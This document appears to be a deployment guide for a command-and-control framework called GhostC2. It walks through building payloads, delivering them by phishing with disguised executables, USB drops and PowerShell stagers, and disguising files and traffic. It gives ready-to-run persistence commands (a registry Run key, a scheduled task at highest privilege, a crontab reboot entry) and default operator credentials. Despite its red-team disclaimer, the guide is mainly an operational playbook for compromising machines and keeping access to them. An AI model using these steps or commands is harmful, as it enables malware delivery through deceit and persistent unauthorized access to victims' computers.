# 💉 GhostC2 Deployment & Persistence Guide

> **DISCLAIMER**: This document is intended for authorized red team operations, cybersecurity research, or academic use **only**. Do not deploy GhostC2 or any of its payloads on systems you do not have explicit permission to access.

---

## 📦 Payload Generation

Generate a polymorphic GhostC2 payload:

```bash
python tools/generate_payload.py --exe
```

Output:
```
builds/ghost_payload_<timestamp>.py
builds/ghost_payload_<timestamp>.exe
```

Use the `.exe` for Windows deployments or `.py` for testing/Linux targets.

---

## 🎯 Delivery Vectors

Choose a method to deliver the payload to the target:

### 1. **Phishing Email**
- Attach the `.exe` disguised as a document (`tracker_invoice.exe`)
- Use social engineering to entice execution

### 2. **Dropper/Downloader**
- Use a lightweight macro or PowerShell stager to fetch and run the payload

### 3. **Removable Media (USB)**
- Drop the payload on a USB stick with a misleading filename
- Optionally use a LNK shortcut to trigger execution

### 4. **Exploit Delivery (Lab)**
- Use exploit frameworks (e.g., `msfvenom`, `exploitdb`) to execute your payload remotely

---

## 🧊 Obfuscation Tips

- Use `--exe` to build as a binary
- Add junk imports or fake error handling to blend in
- Rename file to look legitimate (e.g. `update_service.exe`, `printer_patch.exe`)
- Use reverse proxy over port 443 to hide C2 traffic

---

## 🔁 Adding Persistence

Once the payload runs on a Windows host:

### 🪟 **Option 1: Registry Key**
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ghostsvc /d "%APPDATA%\ghost.exe" /f
```

### 🪟 **Option 2: Scheduled Task**
```powershell
schtasks /create /tn "GhostUpdate" /tr "%APPDATA%\ghost.exe" /sc onlogon /rl highest /f
```

> Place the payload in a hidden folder like `%APPDATA%\Microsoft\Update\ghost.exe`

### 🐧 **Linux/macOS Crontab**
```bash
(crontab -l ; echo "@reboot /usr/local/bin/ghost") | crontab -
```

---

## 🧠 Tips for C2 Operators

- Run the server using:
```bash
cd server
python app.py
```

- Open [http://<your-ip>:8080](http://<your-ip>:8080) in your browser
- Login as:
  ```
  Username: admin
  Password: ghostpass123
  ```

- Send live commands from `/console`
- Results return instantly via WebSocket

---

## 🛡️ Hardening

- Run GhostC2 behind Nginx with TLS
- Change default login credentials
- Enable UFW / firewall rules to whitelist access

---

## ⚠️ Legal Notice

This tool is intended for ethical use in penetration testing labs, educational simulations, or red team operations **with permission**. Misuse can result in criminal charges.

Always follow the law, organizational policy, and responsible disclosure principles.
